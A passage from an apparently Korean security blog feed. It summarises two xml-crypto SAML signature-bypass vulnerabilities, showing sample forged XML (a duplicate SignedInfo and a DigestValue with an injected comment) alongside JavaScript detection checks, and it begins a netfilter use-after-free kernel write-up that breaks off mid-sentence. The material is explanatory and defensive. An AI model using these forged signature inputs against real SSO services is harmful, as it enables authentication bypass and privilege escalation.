&#xBC84;&#xC804;&#xC740; &#xB2E4;&#xC218;&#xC758; <code>&lt;SignedInfo&gt;</code> &#xB178;&#xB4DC;&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xAC00;&#xC9DC; <code>&lt;SignedInfo&gt;</code>&#xAC00; &#xC544;&#xB2CC; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC83;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD558;&#xB098;&#xB294; &#xC720;&#xD6A8;&#xD55C; SignedInfo&#xB85C; &#xB0A8;&#xACA8;&#xB450;&#xACE0;, &#xB2E4;&#xB978; &#xD558;&#xB098;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774;&#xB098; &#xC0AC;&#xC6A9;&#xC790; &#xBCC0;&#xC870;&#xC640; &#xAC19;&#xC740; &#xC545;&#xC758;&#xC801; &#xC870;&#xC791;&#xC744; &#xD3EC;&#xD568;&#xD574; &#xC11C;&#xBA85;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xACF5;&#xACA9; &#xC608;&#xC2DC;&#xC5D0;&#xC11C;&#xB294; <code>&lt;Signature&gt;</code> &#xBE14;&#xB85D; &#xB0B4;&#xC5D0; &#xB450; &#xAC1C;&#xC758; <code>&lt;SignedInfo&gt;</code>&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xACE0;, &#xD558;&#xB098;&#xC5D0; &#xC704;&#xC870;&#xB41C; Digest &#xAC12;&#xC744; &#xD3EC;&#xD568;&#xD574; &#xC778;&#xC99D; &#xC6B0;&#xD68C;&#xB97C; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>CVE-2025-29775</strong>&#xB294; DigestValue &#xC870;&#xC791;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; DigestValue&#xC5D0; HTML &#xC8FC;&#xC11D; (<code>&lt;!-- --&gt;</code>)&#xC744; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1;&#xC801;&#xC778; DigestValue&#xB294; Base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xC21C;&#xC218; &#xB370;&#xC774;&#xD130;&#xC5EC;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, xml-crypto&#xC758; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC740; &#xC774; &#xAC12;&#xC744; &#xB178;&#xB4DC; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD30C;&#xC2F1;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xBB38;&#xC790;&#xC5F4; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD574;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC8FC;&#xC11D;&#xACFC; &#xC704;&#xC870;&#xB41C; &#xAC12;&#xC744; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>    <span class="hljs-comment">&lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;</span>    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span></code></pre><p>&#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC740; &#xC8FC;&#xC11D;&#xC744; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#xC2E4;&#xC81C; DigestValue&#xB9CC;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBA85;&#xC774; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xC9C0;&#xB9CC;, &#xD574;&#xC11D;&#xD558;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xC8FC;&#xC11D;&#xACFC; &#xAC12;&#xC744; &#xACB0;&#xD569;&#xD574; &#xC798;&#xBABB;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C;&#xC368; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2E0;&#xC6D0; &#xC815;&#xBCF4;&#xB098; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xAD50;&#xBB18;&#xD788; &#xBCC0;&#xACBD;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xBC0F; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>xml-crypto</code>&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; SAML SSO&#xB97C; &#xAD6C;&#xD604;&#xD55C; &#xBAA8;&#xB4E0; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xAD11;&#xBC94;&#xC704;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xBA70;, &#xD2B9;&#xD788; &#xC911;&#xC694;&#xD55C; &#xC2E0;&#xC6D0; &#xC815;&#xBCF4;&#xB098; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xB2F4;&#xAE34; XML &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC870;&#xC791;&#xD574;&#xB3C4; &#xC5EC;&#xC804;&#xD788; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>xml-crypto</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; 6.0.1 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; 6.0.0 &#xC774;&#xD558; &#xBC84;&#xC804;&#xC740; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>SignedInfo &#xB178;&#xB4DC; &#xC911;&#xBCF5; &#xC5EC;&#xBD80; (CVE-2025-29774 &#xD0D0;&#xC9C0;&#xBC95;)</strong></p><p>SAML &#xC751;&#xB2F5;&#xC774;&#xB098; XML &#xBB38;&#xC11C; &#xB0B4;&#xC5D0;&#xC11C; <code>&lt;Signature&gt;</code> &#xC548;&#xC5D0; <code>&lt;SignedInfo&gt;</code> &#xB178;&#xB4DC;&#xAC00; &#xB450; &#xAC1C; &#xC774;&#xC0C1; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1; &#xBB38;&#xC11C;&#xB294; &#xBC18;&#xB4DC;&#xC2DC; &#xD558;&#xB098;&#xB9CC; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Signature</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">SomeNode</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">SignedInfo</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span> <span class="hljs-attr">URI</span>=<span class="hljs-string">&quot;somefakereference&quot;</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>forgeddigestvalue<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">SignedInfo</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">SomeNode</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">SignedInfo</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span> <span class="hljs-attr">URI</span>=<span class="hljs-string">&quot;realsignedreference&quot;</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>realdigestvalue<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">SignedInfo</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Signature</span>&gt;</span></code></pre><p>&#xD0D0;&#xC9C0;&#xC6A9; JavaScript &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs jsx"><span class="hljs-keyword">const</span> signedInfoNodes = xpath.select(<span class="hljs-string">&quot;.//*[local-name(.)=&apos;SignedInfo&apos;]&quot;</span>, signatureNode);<span class="hljs-keyword">if</span> (signedInfoNodes.length &gt; <span class="hljs-number">1</span>) {  <span class="hljs-comment">// Compromise detected</span>}</code></pre></li><li><p><strong>DigestValue &#xB0B4; &#xC8FC;&#xC11D; &#xC874;&#xC7AC; &#xC5EC;&#xBD80; (CVE-2025-29775 &#xD0D0;&#xC9C0;&#xBC95;)</strong></p><p><code>&lt;DigestValue&gt;</code> &#xBE14;&#xB85D; &#xC548;&#xC5D0; <code>&lt;!-- --&gt;</code> &#xD615;&#xD0DC;&#xC758; &#xC8FC;&#xC11D;&#xC774; &#xC0BD;&#xC785;&#xB41C; &#xACBD;&#xC6B0;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778; XML &#xC11C;&#xBA85;&#xC5D0;&#xC11C;&#xB294; &#xC808;&#xB300; &#xC788;&#xC5B4;&#xC120; &#xC548; &#xB429;&#xB2C8;&#xB2E4;. &#xBC1C;&#xACAC; &#xC2DC; &#xC870;&#xC791;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xAC04;&#xC8FC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>    <span class="hljs-comment">&lt;!-- malicious comment --&gt;</span>    validDigestValue==<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span></code></pre><p>&#xD0D0;&#xC9C0;&#xC6A9; JavaScript &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p> <pre><code class="hljs jsx"><span class="hljs-keyword">const</span> digestValues = xpath.select(<span class="hljs-string">&quot;//*[local-name()=&apos;DigestValue&apos;][count(node()) &gt; 1]&quot;</span>, decryptedDocument);<span class="hljs-keyword">if</span> (digestValues.length &gt; <span class="hljs-number">0</span>) {  <span class="hljs-comment">// Compromise detected</span>}</code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></p><p><a href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/WorkOS/">WorkOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/xml-crypto/">xml-crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/XML-Signature-Wrapping/">XML Signature Wrapping</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/07/romi0x/1day1line0507/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-26809 : Linux Kernel Netfilter의 Use-After-Free로 인한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/03/j0ker/2025-05-03/</link>
      <guid>https://hackyboiz.github.io/2025/05/03/j0ker/2025-05-03/</guid>
      <pubDate>Sat, 03 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://osec.io/blog/2024-11-25-netfilter-universal</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://osec.io/blog/2024-11-25-netfilter-universal-root-1-day#vulnerability-details">OtterRoot: Netfilter Universal Root 1-day</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 6.8 &#xC774;&#xC0C1; ~ 6.8.2 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 6.7 &#xC774;&#xC0C1; ~ 6.7.11 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 6.2 &#xC774;&#xC0C1; ~ 6.6.23 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 5.18.11 &#xC774;&#xC0C1; ~ 6.1.83 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 5.15.54 &#xC774;&#xC0C1; ~ 5.15.153 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 5.10.130 &#xC774;&#xC0C1; ~ 5.10.214 &#xBBF8;&#xB9CC;</li></ul><h2 id="&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;"><a href="#&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;" class="headerlink" title="&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;"></a>&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;</h2><p>CVE-2024-26809 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110;&#xC758; Netfilter &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC640; nftables &#xC11C;&#xBE0C;&#xC2DC;&#xC2A4;&#xD15C;, &#xADF8;&#xB9AC;&#xACE0; <code>nft_set_pipapo</code> &#xC9D1;&#xD569; &#xC720;&#xD615;&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC774;&#xD574;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Netfilter &#xBC0F; nftables:</strong> Netfilter&#xB294; &#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110; &#xB0B4;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD328;&#xD0B7;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xC870;&#xC791;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD575;&#xC2EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xBC29;&#xD654;&#xBCBD; &#xAD6C;&#xCD95;, NAT(Network Address Translation), &#xD328;&#xD0B7; &#xB85C;&#xAE45; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xB124;&#xD2B8;&#xC6CC;&#xD0B9; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. nftables&#xB294; &#xAE30;&#xC874;&#xC758; <code>iptables</code>, <code>ip6tables</code>, <code>arptables</code>, <code>ebtables</code>&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAC1C;&#xBC1C;&#xB41C; &#xCC28;&#xC138;&#xB300; &#xD328;&#xD0B7; &#xBD84;&#xB958; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C;, &#xB354;&#xC6B1; &#xC720;&#xC5F0;&#xD558;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xADDC;&#xCE59; &#xAD00;&#xB9AC;&#xB97C; &#xBAA9;&#xD45C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;. nftables&#xB294; &#xD14C;&#xC774;&#xBE14;(tables), &#xCCB4;&#xC778;(chains), &#xADDC;&#xCE59;(rules), &#xC9D1;&#xD569;(sets), &#xAC1D;&#xCCB4;(objects) &#xB4F1;&#xC758; &#xCD94;&#xC0C1;&#xD654;&#xB41C; &#xAC1C;&#xB150;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBCF5;&#xC7A1;&#xD55C; &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>nft_set_pipapo:</strong> nftables&#xC758; &#xC9D1;&#xD569;(set)&#xC740; &#xD2B9;&#xC815; &#xB370;&#xC774;&#xD130; &#xC694;&#xC18C;&#xB4E4;&#xC758; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xBE60;&#xB974;&#xAC8C; &#xC870;&#xD68C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. <code>nft_set_pipapo</code>&#xB294; &#x2018;Possible Intersection of Prefix Aggregation Prefix Overlap&#x2019;&#xC758; &#xC57D;&#xC790;&#xB85C;, &#xD2B9;&#xD788; IP &#xC8FC;&#xC18C; &#xBC94;&#xC704;&#xB098; &#xD3EC;&#xD2B8; &#xBC88;&#xD638; &#xBC94;&#xC704;&#xC640; &#xAC19;&#xC740; &#xAC04;&#xACA9;(interval) &#xAE30;&#xBC18;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC9D1;&#xD569; &#xC720;&#xD615; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC9D1;&#xD569; &#xC720;&#xD615;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC7A1;&#xD55C; &#xC790;&#xB8CC;&#xAD6C;&#xC870;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC694;&#xC18C;&#xC758; &#xC0BD;&#xC785;, &#xC0AD;&#xC81C;, &#xAC80;&#xC0C9; &#xC5F0;&#xC0B0;&#xC744; &#xCD5C;&#xC801;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. <code>nft_set_pipapo.c</code> &#xD30C;&#xC77C; &#xB0B4;&#xC758; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xC774; PIPAPO &#xC9D1;&#xD569;&#xC758; &#xC0DD;&#xC131;, &#xC218;&#xC815;, &#xC0AD;&#xC81C;, &#xC694;&#xC18C; &#xAD00;&#xB9AC; &#xB4F1;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xB85C;&#xC9C1;&#xC744; &#xAD6C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xBC0F; &#xD074;&#xB860;:</strong> nftables&#xC758; &#xC124;&#xC815; &#xBCC0;&#xACBD;&#xC740; &#xC6D0;&#xC790;&#xC131;(atomicity)&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xADDC;&#xCE59; &#xCD94;&#xAC00;, &#xC9D1;&#xD569; &#xC694;&#xC18C; &#xBCC0;&#xACBD; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC774; &#xD558;&#xB098;&#xC758; &#xBC30;&#xCE58;(batch)&#xB85C; &#xBB36;&#xC5EC; &#xCC98;&#xB9AC;&#xB418;&#xBA70;, &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xCEE4;&#xBC0B;(commit)&#xB418;&#xACE0; &#xD558;&#xB098;&#xB77C;&#xB3C4; &#xC2E4;&#xD328;&#xD558;&#xBA74; &#xC804;&#xCCB4; &#xC791;&#xC5C5;&#xC774; &#xC911;&#xB2E8;(abort)&#xB418;&#xC5B4; &#xB864;&#xBC31;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC77C;&#xAD00;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xACE0; &#xB3D9;&#xC2DC;&#xC131; &#xBB38;&#xC81C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xBCC0;&#xACBD; &#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xC9D1;&#xD569;&#xACFC; &#xAC19;&#xC740; &#xAC1D;&#xCCB4;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC81C;&#xBCF8;, &#xC989; &#xD074;&#xB860;(clone)&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD074;&#xB860;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xC2DC;&#xC810;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xBC18;&#xC601;&#xD558;&#xB294; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBDF0;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h2 id="&#xCDE8;&#xC57D;&#xC810;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;-&#xC0C1;&#xC138;-&#xC124;&#xBA85;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;-&#xC0C1;&#xC138;-&#xC124;&#xBA85;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC0C1;&#xC138; &#xC124;&#xBA85;"></a>&#xCDE8;&#xC57D;&#xC810; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC0C1;&#xC138; &#xC124;&#xBA85;</h2><p>CVE-2024-26809 &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>nft_set_pipapo</code> &#xC9D1;&#xD569;&#xC758; &#xD074;&#xB860; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xACFC; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xAD00;&#xB9AC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC0AC;&#xC774;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC; &#xC624;&#xB958;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD575;&#xC2EC; &#xBB38;&#xC81C;&#xB294; <strong>&#xD074;&#xB860;&#xB41C; &#xC9D1;&#xD569;&#xC758; &#xC694;&#xC18C;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;</strong>&#xC5D0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xD2B9;&#xC815; &#xC870;&#xAC74;, &#xD2B9;&#xD788; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xC911;&#xB2E8;(abort)&#xB418;&#xAC70;&#xB098; &#xC9D1;&#xD569;&#xC774; &#xC0AD;&#xC81C;(destroy)&#xB418;&#xB294; &#xACBD;&#xC6B0;, &#xD074;&#xB860;&#xB41C; &#xC9D1;&#xD569;&#xC5D0; &#xC18D;&#xD55C; &#xC694;&#xC18C;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC1D;&#xCCB4; &#xD30C;&#xAD34; &#xACBD;&#xB85C;(destroy path)&#xB97C; &#xB530;&#xB974;&#xC9C0; &#xC54A;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xB85C;&#xC9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB137;&#xD544;&#xD130; &#xCEE4;&#xBC0B; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC758; &#xC124;&#xACC4; &#xC6D0;&#xCE59;&#xC0C1;, &#xD074;&#xB860;&#xC740; &#xD56D;&#xC0C1; &#xC870;&#xD68C; &#xD14C;&#xC774;&#xBE14;&#xC758; &#x2018;&#xD604;&#xC7AC; &#xBDF0;(current view)&#x2019;&#xB97C; &#xC81C;&#xACF5;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xAC1D;&#xCCB4;&#xC758; &#xC2E4;&#xC81C; &#xD30C;&#xAD34;&#xB294; &#xC77C;&#xAD00;&#xB41C; &#xD30C;&#xAD34; &#xACBD;&#xB85C;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC838;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC6D0;&#xCE59;&#xC744; &#xC704;&#xBC18;&#xD558;&#xC5EC;, &#xC5B4;&#xBCF4;&#xD2B8; &#xACBD;&#xB85C; &#xB4F1;&#xC5D0;&#xC11C; &#xD074;&#xB860;&#xC758; &#xBDF0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC694;&#xC18C;&#xB97C; &#xC9C1;&#xC811; &#xD574;&#xC81C;&#xD558;&#xB824; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>Double-Free:</strong> &#xD2B9;&#xC815; &#xC870;&#xAC74;(&#xC544;&#xB798; &#xADFC;&#xBCF8; &#xC6D0;&#xC778; &#xBD84;&#xC11D; &#xCC38;&#xC870;) &#xD558;&#xC5D0;&#xC11C; <code>nft_pipapo_destroy</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; <code>nft_set_pipapo_match_destroy</code> 